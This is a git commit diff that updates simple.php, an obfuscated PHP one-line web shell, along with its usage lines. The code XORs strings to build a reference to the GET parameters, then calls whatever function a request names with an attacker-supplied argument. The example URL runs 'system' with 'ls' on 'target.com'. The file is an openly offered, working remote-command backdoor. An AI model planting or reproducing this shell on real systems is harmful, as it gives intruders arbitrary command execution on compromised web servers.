a986a6d7ea928c80a0f5a090a0a987106c3e1ba2
Yinon Gindi <119297985+YinonGindi@users.noreply.github.com>
2025-08-20 11:19:42 +0300

    Update simple.php

--- simple.php
+++ simple.php
@@ -1,4 +1,4 @@
-<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']($_['____']));?>
+<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]);?>
 
-[*] Usage: http://target.com/path/to/shell.php?__=function1&___=function2&____=argument
-[*] E.g.: http://target.com/path/to/shell.php?__=var_dump&___=scandir&____=/sss
+[*] Usage: http://target.com/path/to/shell.php?0=function&1=argument
+[*] E.g.: http://target.com/path/to/shell.php?0=system&1=ls
